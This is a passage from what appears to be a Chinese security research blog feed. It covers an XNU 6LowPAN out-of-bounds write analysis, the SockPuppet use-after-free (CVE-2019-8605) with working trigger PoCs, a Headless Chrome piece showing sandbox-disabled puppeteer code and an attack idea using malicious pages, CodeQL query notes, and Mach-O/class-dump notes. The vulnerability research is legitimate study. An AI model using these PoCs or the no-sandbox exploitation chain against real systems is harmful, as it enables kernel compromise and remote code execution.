m-&gt;m_flags &amp;= ~M_HASFCS; } if ((eh-&gt;ether_dhost[0] &amp; 1) == 0) { /* * When the driver is put into promiscuous mode we may receive * unicast frames that are not intended for our interfaces. * They are marked here as being promiscuous so the caller may * dispose of them after passing the packets to any interface * filters. */ if (_ether_cmp(eh-&gt;ether_dhost, IF_LLADDR(ifp))) { m-&gt;m_flags |= M_PROMISC; } } /* check for IEEE 802.15.4 */ if (ether_type == htons(ETHERTYPE_IEEE802154)) { *protocol_family = PF_802154; return 0; } 如果以太报头中的 ether_type 是 ETHERTYPE_IEEE802154 , 那么该函数会将协议族设置为PF 802154。 现在，在默认配置中，这个协议族将不会被处理，除非配置了6lowpan接口，这将导致以下代码注册一个函数 sixlowpan_input ，当处理一个802.15.4帧时将被调用。 123456789101112131415161718192021222324/* * Function: sixlowpan_attach_protocol * Purpose: * Attach a DLIL protocol to the interface * The ethernet demux actually special cases 802.15.4. * The demux here isn't used. The demux will return PF_802154 for the * appropriate packets and our sixlowpan_input function will be called. */static intsixlowpan_attach_protocol(struct ifnet *ifp){ int error; struct ifnet_attach_proto_param reg; bzero(&amp;reg, sizeof(reg)); reg.input = sixlowpan_input; reg.detached = sixlowpan_detached; error = ifnet_attach_protocol(ifp, PF_802154, &amp;reg); if (error) { printf(\"%s(%s%d) ifnet_attach_protocol failed, %d\\n\", __func__, ifnet_name(ifp), ifnet_unit(ifp), error); } return error;} Vulnerability Details调用sixlowpan_input函数来解封装802.15.4数据帧 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869/* * 6lowpan input routine. * Decapsulate the 802.15.4 Data Frame * Header decompression on the payload * Pass the mbuf to the IPV6 protocol stack using proto_input() */static intsixlowpan_input(ifnet_t p, __unused protocol_family_t protocol, mbuf_t m, __unused char *frame_header){ frame802154_t ieee02154hdr; u_int8_t *payload = NULL; if6lpan_ref ifl = NULL; bpf_packet_func bpf_func; mbuf_t mc, m_temp; int off, err = 0; u_int16_t len; /* Allocate an mbuf cluster for the 802.15.4 frame and uncompressed payload */ mc = m_getcl(M_WAITOK, MT_DATA, M_PKTHDR); if (mc == NULL) { err = -1; goto err_out; } memcpy(&amp;len, mtod(m, u_int8_t *), sizeof(u_int16_t)); len = ntohs(len);** // This is the size read from the frame on the wire. m_adj(m, sizeof(u_int16_t)); /* Copy the compressed 802.15.4 payload from source mbuf to allocated cluster mbuf */ for (m_temp = m, off = 0; m_temp != NULL; m_temp = m_temp-&gt;m_next) { if (m_temp-&gt;m_len &gt; 0) { m_copyback(mc, off, m_temp-&gt;m_len, mtod(m_temp, void *)); off += m_temp-&gt;m_len; } } p = p_6lowpan_ifnet; mc-&gt;m_pkthdr.rcvif = p; sixlowpan_lock(); ifl = ifnet_get_if6lpan_retained(p); if (ifl == NULL) { sixlowpan_unlock(); err = -1; goto err_out; } if (if6lpan_flags_ready(ifl) == 0) { if6lpan_release(ifl); sixlowpan_unlock(); err = -1; goto err_out; } bpf_func = ifl-&gt;if6lpan_bpf_input; sixlowpan_unlock(); if6lpan_release(ifl); if (bpf_func) { bpf_func(p, mc); } /* Parse the 802.15.4 frame header */ bzero(&amp;ieee02154hdr, sizeof(ieee02154hdr)); frame802154_parse(mtod(mc, uint8_t *), len, &amp;ieee02154hdr, &amp;payload); /* XXX Add check for your link layer address being dest */ sixxlowpan_input(&amp;ieee02154hdr, payload); m_getcl 分配mc(mbuf cluster)来存放要处理的 802.15.4 f帧和未解压的payload 拷贝未解压的802.15.4 payload 到新分配的mc中 len 是从参数 mbuf m 中读取得到的，这是一个可控的值，在后面解析逻辑: frame802154_parse ，这个长度是直接使用的。 因为我们可以将len控制在0-0xffff之间，所以我们可以使pf-&gt;payload_len为负值(to-header len)，小于预期的大小，或者大于mc中输入数据本身的大小。 随后的调用是 sixxlowpan_input(&amp;ieee02154hdr, payload); 这个函数直接使用了 之前解析出来的pf 和 payload。 1234567891011121314151617errno_tsixxlowpan_input(struct frame802154 *ieee02154hdr, u_int8_t *payload){ errno_t error = 0; error = sixxlowpan_uncompress(ieee02154hdr, payload); if (error != 0) { goto done; } /* * TO DO: fragmentation */done: return error;} 之后走到 sixxlowpan_uncompress 函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344errno_tsixxlowpan_uncompress(struct frame802154 ***ieee02154hdr**, u_int8_t *payload){ long hdroffset; size_t hdrlen; u_int8_t hdrbuf[128]; errno_t error; bzero(hdrbuf, sizeof(hdrbuf)); hdrlen = sizeof(hdrbuf); error = uncompress_hdr_hc1(ieee02154hdr, (u_int8_t *)payload, 0, &amp;hdroffset, &amp;hdrlen, hdrbuf); // 0 if (error != 0) { return error; } if (hdroffset &lt; 0) { // 1 /* * hdroffset negative means that we have to remove * hdrlen of extra stuff */ memmove(&amp;payload[0], &amp;payload[hdrlen], ieee02154hdr-&gt;payload_len - hdrlen); ieee02154hdr-&gt;payload_len -= hdrlen; } else { /* * hdroffset is the size of the compressed header * -- i.e. when the untouched data starts * * hdrlen is the size of the decompressed header * that takes the place of compressed header of size hdroffset */ memmove(payload + hdrlen, payload + hdroffset, ieee02154hdr-&gt;payload_len - hdroffset); // 2， oob write here, `ieee02154hdr-&gt; payload_len-3 = -2` memcpy(payload, hdrbuf, hdrlen); ieee02154hdr-&gt;payload_len += hdrlen - hdroffset; } return 0;} 因此，如果我们将接收到的帧的len设置为0x4，则最终将计算出以下值(frame802154_parse)： c header length = 3 frame-&gt;payload_len= 1 同时，在uncompress_hdr_hc1函数中（at 0)，控制流程走到 SICSLOWPAN_HC1_NH_UDP 分支： 123*hdroffset = SICSLOWPAN_HC1_HDR_LEN; --&gt; *hdroffset = 3*hdrlen = UIP_IPH_LEN; --&gt; *hdrlen = 40sizeof(struct ip6_hdr) = 40 再回到上层函数sixxlowpan_uncompress (at 1)，hdroffset 为3，走下面的分支，能够走到 memmove调用(at 2) 123memmove(payload + hdrlen, payload + hdroffset, ieee02154hdr-&gt;payload_len - hdroffset); where : payload + 40 what : source payload buffer, 可控 length : ieee02154hdr-&gt;payload_len - hdroffset 即 payload_len - hdroffset = 1 - 3 = -2 引用Building XNU for macOS Big Sur 11.0.1 (Intel) D4rkD0g/boringforever Kernel crash caused by out-of-bounds write in Apple’s ICMP packet-handling code (CVE-2018-4407) - GitHub Security Lab CVE-2020-9967 - Apple macOS 6LowPAN Vulnerability","link":"/2021/02/15/CodeQL-XNU-From-0-to-1/"},{"title":"SockPuppet学习记录(一) : 漏洞分析","text":"Basic 这个漏洞是由pj0的 nedwill 发现的，而且是一个品相极佳的可以用于越狱的漏洞，本文只是对漏洞进行分析，并且思考/尝试使用CodeQL对该类型漏洞覆盖。当然，在看了原作者的文章之后，才发现nedwill是利用Fuzzing的手段发现的这个漏洞，并且在挖掘读/写原语的时候也是借助了Fuzzing的手段，可以说十分的巧妙和高效了。 漏洞issue ：1806 - project-zero - Project Zero - Monorail 系统版本：10.14.3 xnu代码： pocraw poc在测试原始PoC获得的Crash信息如下： 原始PoC使用了raw socket触发，但是美中不足，这个方式必须要root权限才能触发。(定制化sockaddr_in6 需要raw socket) 1234567891011121314151617181920212223242526272829303132333435363738#define IPPROTO_IP 0#define IN6_ADDR_ANY { 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 }#define IN6_ADDR_LOOPBACK { 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1 }int main() { int s = socket(AF_INET6, SOCK_RAW, IPPROTO_IP); printf(\"res0: %d\\n\", s); struct sockaddr_in6 sa1 = { .sin6_len = sizeof(struct sockaddr_in6), .sin6_family = AF_INET6, .sin6_port = 65000, .sin6_flowinfo = 3, .sin6_addr = IN6_ADDR_LOOPBACK, .sin6_scope_id = 0, }; struct sockaddr_in6 sa2 = { .sin6_len = sizeof(struct sockaddr_in6), .sin6_family = AF_INET6, .sin6_port = 65001, .sin6_flowinfo = 3, .sin6_addr = IN6_ADDR_ANY, .sin6_scope_id = 0, }; int res = connect(s, (const sockaddr*)&amp;sa1, sizeof(sa1)); printf(\"res1: %d\\n\", res); unsigned char buffer[4] = {}; res = setsockopt(s, 41, 50, buffer, sizeof(buffer)); printf(\"res1.5: %d\\n\", res); res = connect(s, (const sockaddr*)&amp;sa2, sizeof(sa2)); printf(\"res2: %d\\n\", res); close(s); printf(\"done\\n\");} read后续ned经过研究发现可以通过tcp socket方式触发，可以用于read free’d memroy: 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;netinet/in.h&gt;/*TCP-based reproducer for CVE-2019-8605This has the benefit of being reachable from the app sandbox on iOS 12.2.*/#define IPV6_3542PKTINFO 46int main() { int s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP); printf(\"res0: %d\\n\", s); unsigned char buffer[1] = {'\\xaa'}; int res = setsockopt(s, IPPROTO_IPV6, IPV6_3542PKTINFO, buffer, sizeof(buffer)); printf(\"res1: %d\\n\", res); res = disconnectx(s, 0, 0); printf(\"res2: %d\\n\", res); socklen_t buffer_len = sizeof(buffer); //get sth from ... res = getsockopt(s, IPPROTO_IPV6, IPV6_3542PKTINFO, buffer, &amp;buffer_len); printf(\"res3: %d\\n\", res); printf(\"got %d\\n\", buffer[0]); close(s); printf(\"done\\n\");} write经过nedwill的Fuzzing测试，发现了write free’d memory 的PoC： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748//// setoptshut.m// ExploitDev// TCP-based reproducer for CVE-2019-8605, using SONPX_SETOPTSHUT to do a// write to the freed memory. Tested on iOS 12.2.//// Created by Ned Williamson on 6/17/19.// Copyright © 2019 Ned Williamson. All rights reserved.//#import &lt;UIKit/UIKit.h&gt;#import \"AppDelegate.h\"#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;netinet/in.h&gt;#define IPV6_USE_MIN_MTU 42int main(int argc, char * argv[]) { while (1) { int s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP); printf(\"res0: %d\\n\", s); // Permit setsockopt after disconnecting (and freeing socket options) struct so_np_extensions sonpx = {.npx_flags = SONPX_SETOPTSHUT, .npx_mask = SONPX_SETOPTSHUT}; int res = setsockopt(s, SOL_SOCKET, SO_NP_EXTENSIONS, &amp;sonpx, sizeof(sonpx)); printf(\"res1: %d\\n\", res); int minmtu = -1; res = setsockopt(s, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &amp;minmtu, sizeof(minmtu)); printf(\"res2: %d\\n\", res); res = disconnectx(s, 0, 0); printf(\"res3: %d\\n\", res); // set, write sth... res = setsockopt(s, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &amp;minmtu, sizeof(minmtu)); printf(\"res4: %d\\n\", res); close(s); printf(\"done\\n\"); } @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); }} bug analysis根据漏洞描述，可以看到漏洞的 root cause如下： 1234567891011121314151617181920voidin6_pcbdetach(struct inpcb *inp){ // ... if (!(so-&gt;so_flags &amp; SOF_PCBCLEARING)) { struct ip_moptions *imo; struct ip6_moptions *im6o; inp-&gt;inp_vflag = 0; if (inp-&gt;in6p_options != NULL) { m_freem(inp-&gt;in6p_options); inp-&gt;in6p_options = NULL; // &lt;- good } ip6_freepcbopts(inp-&gt;in6p_outputopts); // &lt;- bad ROUTE_RELEASE(&amp;inp-&gt;in6p_route); // free IPv4 related resources in case of mapped addr if (inp-&gt;inp_options != NULL) { (void) m_free(inp-&gt;inp_options); // &lt;- good inp-&gt;inp_options = NULL; } 漏洞路径 bsd/netinet6/in6_pcb.c ，协议族 AF_INET6 的处理函数，从函数名字来看是断开连接时候会执行的一些操作（释放一些资源），但是释放之后忘记把指针置NULL，导致同一个套接字重连的时候又使用到了这个指针（悬垂指针）。根据nedwill的描述，连接断开再set/get socketopt的场景可以触发。 进入函数之前有一个 socket so_flags 的检查，poc中的 setsockopt() 调用应该是为了能过进入漏洞逻辑设计的。 利用 socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP); 这个poc，逻辑应该是： 创建socket连接 setsockopt，为了后续可以进入漏洞代码分支，同时设置要读的数据 disconnectx 断开连接，触发 free 逻辑 getsockopt，读取已经释放的内存 写的逻辑类似，不过作者是找到了另外特殊的成员来完成写操作： SONPX_SETOPTSHUT 这个洞的品相太好了 :-) how to find by QLxnu database可以从semmle官方网站下载 Analyzing large open source projects about this bug看起来是： 123456789101112131415int demo(p){ ptr, p2; // .... free(ptr); ptr = NULL; m_free(p-&gt;p1); // vuln! if(xxx){ freem(p2); p2 = NULL; }} 释放了内存之后，没有对指针做置NULL处理。 需要在同一个函数里，同一个代码块里。 锁的问题考虑吗？ 释放逻辑，正则匹配下， xxxfree, freexxx, releasexxx之类的 query 1根据上面的描述，我们找到free 调用，且free调用下一行是特定的赋值表达式的情况： 12345678import cppfrom FunctionCall call, AssignExpr ewhere call.getTarget().getName().regexpMatch(\".*free.*?\") and call.getEnclosingBlock() = e.getEnclosingBlock() and e.getRValue().(Literal).getValue() = \"0\" and call.getLocation().getStartLine() + 1 = e.getLocation().getStartLine()select call, call.getEnclosingFunction().getName(), call.getArgument(0) 这里有一个问题，我尝试过 free调用的参数作为赋值表达式的左值 这条约束，但是加上之后就找不到任何结果了，如果有人知道原因还请指点一下 : ) query 2上面query可以找到 free后是set NULL的代码段，如果想找不满足条件的，可以检测free逻辑下一行是不是 instance of AssignExpr，当然这样比较粗糙，会存在误报。 123456from FunctionCall call, Expr ewhere call.getTarget().getName().regexpMatch(\".*free.*?\") and call.getEnclosingBlock() = e.getEnclosingBlock() and not(e instanceof AssignExpr ) and call.getLocation().getStartLine() + 1 = e.getLocation().getStartLine()select call, call.getEnclosingFunction().getName(), call.getArgument(0) 这样写，虽然可以找到目标代码，但是存在误报（优化TODO）：","link":"/2021/02/28/SockPuppet%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%80-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"Exploit Headless Chrome","text":"背景Chrome M59引入了 Headless Chrome，至此可以在无GUI的环境下使用Chrome，极大的方便了自动化测试工作，也可以用于预览服务，或者网络爬虫。 前端并不是我的强项，我在上网冲浪的时候发现一个很有趣的现象： 很多技术文章相互参考，有些代码自然也直接复制粘贴使用 Headless Chrome自然也是这样，一些不好的编程习惯也被错误地传播 于是有了本文，以及一些个人的思考。 思考 🤔首先，在Google搜索Headless Chrome相关的技术文章，会跳出来官方文档以及各种技术文章: (关键词顺序反了，不过不影响 XD ) Headless Chrome其实就是从命令行启动Chrome，传递了--headless的参数，那么对于Chrome来说，有很多参数，但是有那么几个参数非常危险，比如 : --no-sandbox，--disable-web-security，以及开启调试端口… 在看了很多网上的文章后，我发现有不少代码是重复的（关键逻辑），比如这篇: 对于错误的参数也是一样的，比如不约而同地关闭sandbox: 123const browser = await puppeteer.launch( {args: ['--no-sandbox', '--disable-setuid-sandbox'] }); 或者调试端口不是 9222就是9229这类情况。 这里其实有几个问题： 我使用的参数是什么意思？ 这些参数对我的程序有什么影响？ 这些参数安全吗？ 什么情况下我可以用，什么情况下不能使用？ 如果搞不清楚，对于只是个人学习来说搞个demo那倒还好，如果说是用于实际项目，比如写预览服务，爬虫等项目，还是直接使用了这些危险的参数那就太危险了。 线上环境要求稳定，不一定是最新版本node，即不一定是最新版本Chrome 危险的参数(比如--disable-web-security)，没有开启沙箱，开了调试端口等 老版本Chrome + NOSANDBOX = RCE 🤔 至此，我认为可以搞个Demo验证一下这个攻击思路是否可行。 DemoPages这里直接扒了xlab某次安全推送，然后在本地跑起来，假装是一个目标网页： 下面搞两个场景吧，第一个是预览，简化一下，截图好了；第二个是爬虫，爬取这网页上的信息。 Demo1 : 预览预览的场景有很多，比如常见的IM中，发送的URL可能会被渲染成“卡片”，不同IM处理不一样，一般来说只有白名单才会这样。 我这边不会搞太复杂的东西，就直接用截图代替了，直接也从网上”东拼西凑“点代码： 1234567891011121314151617181920212223const puppeteer = require('puppeteer');(async () =&gt; { targetUrl = \"https://www.google.com.hk\"; try { const args = process.argv.slice(2) targetUrl = args[0]; } catch (e) { console.log(e); } // FIXME : I should open SANDBOX, this cmdline is wrong !!! const browser = await puppeteer.launch({ executablePath: '/usr/bin/google-chrome', args: ['--no-sandbox', '--disable-setuid-sandbox'] }); const page = await browser.newPage(); await page.goto(targetUrl); await page.screenshot({ path: 'res.png' }); await browser.close();})(); 功能也比较简单，预览指定的网页，我这里搞得简单，直接截图然后保存，IM里那种卡片式不知道怎么搞，就没去尝试，不过也是个攻击面啦 🤣 跑一下Demo： 如果在页面里加载恶意的JS呢？ 直接使用script 标签加载 加入js，使用js web worker加载 BOOM : Demo2 : 爬虫这里直接抄了https://www.anquanke.com/post/id/103350 里的代码: 1234567891011121314151617181920212223242526272829303132333435$ cat crawler.js const puppeteer = require('puppeteer');(async () =&gt; { // FIXME : I should open SANDBOX, this cmdline is wrong !!! const browser = await puppeteer.launch({ executablePath: '/usr/bin/google-chrome', args: ['--no-sandbox', '--disable-setuid-sandbox'] }); const page = await browser.newPage(); await page.goto('http://localhost/foo.html', { waitUntil: 'networkidle0' }); //count let eleCount = await page.evaluate((sel) =&gt; { return document.getElementsByClassName(sel).length; }, 'category'); if(eleCount != 0){ let htmlArray = await page.evaluate((sel, eleCount) =&gt; { let element = document.querySelectorAll(sel); let htmlArray = []; for(let i = 0; i &lt;= eleCount; i++){ htmlArray[i] = element[i].innerText; } htmlArray.shift(); return htmlArray; }, 'p', eleCount); console.log(htmlArray); } await browser.close();})(); 预期行为： 看起来不错 : ) 加入恶意的JS之后: 这里有个地方不完美，我本来尝试js web worker加载exp，想 爬虫正常工作，爬取到需要的内容，exp在后台跑，但是我发现要么时间不够我跑exp（需要爬虫停留的久一点），要么就exp跑了，但是内容没爬取到。这点我认为应该可以解决，如果有知道的前端大佬可以分享一下~ 后记那么是否存在这样一条攻击链，针对爬虫或者一些Headless Chrome的服务： 恶意构造页面，集成多个Exploit，覆盖大量Chrome版本，打进去就挖矿or种勒索？ 最后还是建议以官方文档为准，写代码参考文档而不是从网上的技术文章里摘 : ) Demo &amp; Exphttps://github.com/o0xmuhe/headless_chrome_demo 参考 https://developers.google.com/web/updates/2017/04/headless-chrome https://www.anquanke.com/post/id/103350 https://xz.aliyun.com/t/2120 https://wangxin1248.github.io/python/2018/09/python3-spider-8.html https://zhuanlan.zhihu.com/p/29207391","link":"/2021/05/26/Chrome-headless-exploit/"},{"title":"CodeQL JS&#x2F;TS Journey","text":"关于之前做过的一些使用CodeQL对JS/TS项目做扫描的笔记。 关于构建数据库过程对于JS/TS的项目来说，CodeQL统一都是 --language=javascript 的参数处理的，而且它主要是扫描，解析，然后构建数据库，对于小项目直接默认参数应该是ok的： 12codeql database create --language=javascript &lt;your_prj&gt;# codeql database bundle -o &lt;your_prj_db&gt;.zip &lt;your_prj&gt; 但是对于比较大型的项目来说，因为CodeQL是Java写的，所以可能会存在内存不足导致构建数据库失败的情况： 12FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed -JavaScript heap out of memory 默认给的内存是2400MB，大项目必然不够啊，文件太多了。 找了一圈没有解决方案，索性直接掏出JD_GUI把它的jar包给反编译了，发现是通过环境变量控制的： 1export SEMMLE_TYPESCRIPT_RAM=8000 这个不是给JAVA的那个内存设置(-J-Xmx1234M) Query接口函数1234567891011interface FooInterface{4//...}export interface outerApiConfig {4foo: (params: xxxxx) =&gt; Promise&lt;{ // whatever ..}&gt;;44bar: (params: FooInterface) =&gt; Promise&lt;{ // whatever..}&gt;;44// ...} 拿这个Demo为例，很多接口函数统一导出，需要借助InterfaceDeclaration 来找，不过我的方法有点“笨”。 123456789101112import javascriptpredicate isOuterAPIs(Function f){ exists(InterfaceDeclaration apis | apis.getIdentifier().toString() = \"outerApiConfig\" and apis.getAMember().getName() = f.getName() )}from Function fwhere isOuterAPIs(f)select f.getName() 我这里实现很粗暴，就是限制函数名(字符串值)和Interface里成员名字(字符串值)一致，就认为这个函数是导出接口中的函数。 特定参数的处理在我的需求中，我需要重点关注，参数中带有路径的函数，换言之就是需要识别出这么多接口函数中，参数带有path的情况，那么很直接的思路就是利用正则，但是在实际的场景下，你会发现代码真的写出了“花”，不是常规的query能覆盖的。 12345678910foo: (params: WTFParams) =&gt; Promise&lt;....&gt;;bar: (params: { arg: string }) =&gt; Promise&lt;{ ...}&gt;; function magic(x) { return ()=&gt;{ //... };} 参数是一个interface，你需要对这个interface再限制，即这个interface的成员是不是path 参数直接就是 {arg : string} 这类情况 奇怪的函数写法，函数体在return里 123456789101112131415161718class PathParamInterfaceType extends InterfaceType{ PathParamInterfaceType(){ getInterface().getAMember().getName().toLowerCase().indexOf(\"path\") &gt; 0 }}predicate isParamPath(Function f){ ( f.getAParameter().getType() instanceof PathParamInterfaceType or f.getAParameter().getType().toString().toLowerCase().indexOf(\"path\") &gt; 0 ) or ( f.getNumParameter() = 0 and f.getAReturnStmt().getExpr().(Function).getAParameter().getType().toString().toLowerCase().indexOf(\"path\") &gt; 0 )} 必须依赖TaintTracking吗最后一个问题比较简单了，就是有了source，然后再找合适的sink，看有没有路径就行了；但是其实还有一种办法会来得更直接，就是利用传递闭包，但是会带来比较多的误报，好处是实现起来简单，想要排除误报，只需要增加限制即可，看具体需求吧，哪个方法合适用哪个。 CodeQL的JS/TS部分实现不如cpp多，所以有些predicate需要自己手动实现，比如用cpp做query可以： 123456FunctionCall getFunctionToACall(FunctionCall fc){ result = fc.getBasicBlock().getEnclosingFunction().getACallToThisFunction()}select getFunctionToACall*(FunctionCall fc) 但是JS/TS部分没有getACallToThisFunction ，根据原理，手动实现一个即可： 12345678910CallExpr getACallToThisFunction(Function f){ exists( CallExpr c | c.getCalleeName() = f.getName() and result = c )}CallExpr getFunctionToACall(CallExpr call){ result = getACallToThisFunction(call.getEnclosingFunction())} 所以，如果想要查询foo函数的传递闭包，就可以： 123from CallExpr callwhere call.getCalleeName() = \"foo\"select getFunctionToACall*(call) 参考https://xz.aliyun.com/t/7482 CodeQL for research https://ctftime.org/writeup/22177 https://kernelshaman.blogspot.com/2021/01/building-xnu-for-macos-big-sur-1101.html https://github.com/D4rkD0g/boringforever/blob/main/xnu/boringanalysis/codeql_xnu.md https://codeql.github.com/docs/codeql-cli/","link":"/2021/06/01/CodeQL-JS-TS-Journey/"},{"title":"iOS RE 4 beginners 1 - MachO &amp;&amp; class-dump","text":"roadmap之前在 iosre看到一张比较系统的iOS逆向学习路线图，因为接触过一段时间macOS上服务的漏洞挖掘，所以对*OS安全还是挺有兴趣的，也一直想系统性地学习下iOS逆向，之前的一直不成体系，也很零碎，正好对着这个图重构下知识体系。 macho file format 类似Windows/Linux平台逆向学习，首先要学习正向开发的基础知识，以及涉及的文件格式(指可执行文件)： Windows - PE Linux - ELF *OS - MachO 根据roadmap中的app分析流程，第一步就是“砸壳“，就是在根据文件格式做文章，因为macho文件是加密的，被加载到内存执行的时候才会解密，所以我们做静态分析，需要把内存中解密之后的可执行文件dump出来，并修复文件才可以拖入hopper/IDA正常分析。 Overview 我感觉这些可执行文件大同小异的味道，基本都是文件头+各种节区。 在macOS上你可以使用： MachOView MachOExplorer 来查看一个macho文件的结构，推荐前者，后者不知道为什么总是卡卡的，而且很容易崩溃 :( 总体上来看，macho文件格式可以看做： Header Load Commands LC_SEGMENT TEXT DATA LINKEDIT LC_CODESIGNATURE LC_DYLD_INFO_ONLY LC_XXXX_DYLIB Data Segment(1-n) Header只关注几个基本字段 magic number : 表示macho的类型，FAT, ARMv7,ARM64,x86_64 FAT 就是 “胖文件”，表示这个文件里包含了多个架构的MachO文件，可以使用lipo分离 CPU Type, CPU SubType : arch Number of load commands : Load commands的数量 flags：表示一些标识位，比如是否开了PIE，checksec可以从这里获取一些信息。 reversed：64位保留字段 Load Commands 即告诉操作系统，该如何加载文件中的数据。 LC_SEGMENT_64：定义一个段，加载后被映射到内存中，包括里面的节。 比如代码段 数据段 : TEXT 代码段 DATA 数据段 LC_DYLD_INFO_ONLY：记录了有关链接的重要信息，包括在_LINKEDIT中动态链接 相关信息的具体偏移和大小。ONLY表示这个加载指令是程序运行所必需的，如果旧的 链接器无法识别它，程序就会出错。 LC_SYMTAB：为文件定义符号表和字符串表，在链接文件时被链接器使用，同时也用于调试器映射符号到源文件。符号表定义的本地符号仅用于调试，而已定义和未定义的external符号被链接器使用。 LC_DYSYMTAB:将符号表中给出符号的额外符号信息提供给动态链接器。 LC_LOAD_DYLINKER：默认的加载器路径。 /usr/lib/dyld LC_UUID：用于标识MachO文件的ID，也用于崩溃堆栈和符号文件的对应解析。 LC_VERSION_MIN_IPHONEOS：系统要求的最低版本。 LC_SOURCE_VERSION：构建二进制文件的源代码版本号。 LC_MAIN：程序的入口。dyld获取该地址，然后跳转到该处执行。 LC_ENCRYPTION_INFO_64：文件是否加密的标志，加密内容的偏移和大小。 lldb dump 砸壳修复文件之后，需要修改该标识位以确保正常反汇编文件。 LC_LOAD_DYLIB:依赖的动态库，包括动态库名称、当前版本号、兼容版本号。 “otool -L xxx”命令查看 LC_RPATH： Runpath Search Paths, @rpath 搜索的路径。 LC_FUNCTION_STARTS：函数起始地址表，使调试器和其他程序能很容易地看到一个地址是否在函数内。 LC_DATA_IN_CODE：定义在代码段内的非指令的表。 LC_CODE_SIGNATURE：代码签名信息。 codesign -d [filename] Data-Segments各种节区，比如代码段，数据段，只读数据段等： 这里可以看到很多__DATA, __objc__? 节区，Symbol Table String Table也单独列了出来。 __objc_protolist __objc_classlist __objc_catlist section … 这些节区保存了OC中类名，函数名等信息，这就为从MachO中dump出来头文件打下了基础。 Get class info from macho file__DATA, __objc_protolist节区： 存储的都是指针，指向一个又一个protocol的结构，可以参考objc的代码 : 1234567891011121314151617181920212223struct protocol_t : objc_object { const char *mangledName; struct protocol_list_t *protocols; method_list_t *instanceMethods; method_list_t *classMethods; method_list_t *optionalInstanceMethods; method_list_t *optionalClassMethods; property_list_t *instanceProperties; uint32_t size; // sizeof(protocol_t) uint32_t flags; // Fields below this point are not always present on disk. const char **_extendedMethodTypes; ...... }struct objc_object {private: isa_t isa;public: ...} 所以我们可以按照结构体索引 __DATA, __objc_protolist 里指针指向的位置的数据，就可以解析出来protocol的类型，名字，方法等信息。 class-dump read notesenvmacos11.4 + xcode12 compileQ : openssl/aes.h not found A : add header file path 12export LDFLAGS=\"-L/usr/local/opt/openssl/lib\"export CPPFLAGS=\"-I/usr/local/opt/openssl/include\" XCode中的配置是: Q : Library not found for -lcrypto A : add the missing dylib raed &amp;&amp; debug核心逻辑就看 12345678910111213141516171819202122- (void)processObjectiveCData;{ for (CDMachOFile *machOFile in self.machOFiles) { CDObjectiveCProcessor *processor = [[[machOFile processorClass] alloc] initWithMachOFile:machOFile]; [processor process]; [_objcProcessors addObject:processor]; }}- (void)process;{ if (self.machOFile.isEncrypted == NO &amp;&amp; self.machOFile.canDecryptAllSegments) { [self.machOFile.symbolTable loadSymbols]; [self.machOFile.dynamicSymbolTable loadSymbols]; [self loadProtocols]; [self.protocolUniquer createUniquedProtocols]; // Load classes before categories, so we can get a dictionary of classes by address. [self loadClasses]; [self loadCategories]; }} 1. symbolTable loadSymbolsLoad Commands 里找到 LC_SYMTAB，然后找到 __DATA(依赖属性 RW)。 然后利用 LC_SYMTAB 初始化了cursor开始遍历找符号。 strtab 从 string table 开始 ： 一个 symbol起始位置，一个string起始位置。 然后根据 arm 还是 x64 走不同的逻辑(这里目标是ARM64的Binary) : 开始解析 symbol table，item by item 12345string table index --&gt; 在string table里找到对应的 stringtypesection indexdescvalue 然后根据string table index里找到对应的string，放到symbols数组里， 根据 string 的 value 判断是不是 class，这里是根据字符串的开头是不是 @&quot;*OBJC_CLASS*$_&quot;。 对于解析出来class name，添加到 class symbols dict里，这样处理之后，symbols， classSymbols都有了。 2. dynamicSymbolTable loadsymbols类似1 3. loadProtocols从 __DATA , __objc_protolist 读取 对应的value 比如得到地址0x1009ccc58 走到 - (CDOCProtocol *)protocolAtAddress:(uint64_t)address 初始化对应的CDOCProtocol对象 依赖这个地址，从文件对应地址读取出来 这个 proto的相关信息: 123456789101112struct cd_objc2_protocol objc2Protocol;objc2Protocol.isa = [cursor readPtr];objc2Protocol.name = [cursor readPtr];objc2Protocol.protocols = [cursor readPtr];objc2Protocol.instanceMethods = [cursor readPtr];objc2Protocol.classMethods = [cursor readPtr];objc2Protocol.optionalInstanceMethods = [cursor readPtr];objc2Protocol.optionalClassMethods = [cursor readPtr];objc2Protocol.instanceProperties = [cursor readPtr];objc2Protocol.size = [cursor readInt32];objc2Protocol.flags = [cursor readInt32];objc2Protocol.extendedMethodTypes = 0; name protocols这些字段是一个地址，指向对应的值(字符串/数组) 最后参照objc2Protocol的值，分别获取protocol 的 name， 各种methods，属性等，初始化了protocol对象 所以protocols就都处理出来了，最后得到了 _protocolsByAddress __NSDictionaryM * 6781 key/value pairs 0x0000000112f93820 4. protocolUniquer createUniquedProtocols依赖3中找到的 _protocolsByAddress name -&gt; protocol 对应关系的dict addr -&gt; protocol 对应关系的dict p1-&gt;protocols 里还有protocol，merge进来(adopted protocols) p1 : _name __NSCFString * @”AWEFriendsActivityWidgetConfigurationIntentHandling” 0x0000000112fbc710 p2 : _name NSTaggedPointerString * @”NSObject” 0x07518ee6ed78d7f9 @interface AWEFriendsActivityWidgetConfigurationIntentHandling : NSObject { //blablabla… } 这种情况 5. loadClasses解析section ： __DATA __objc_classlist 和3类似的套路，先得到 一个 地址，然后根据地址，去文件中索引对应的结构： CDOCClass *aClass = [self loadClassAtAddress:val] 只调试一次过程分析即可: val uint64_t 4335166480 In [2]: hex(4335166480) Out[2]: '0x102656410' 这个0x102656410，使用machoview也能看到，调试+machoview对比看，更容易理解。 loadClassAtAddress方法分析： 123456789struct 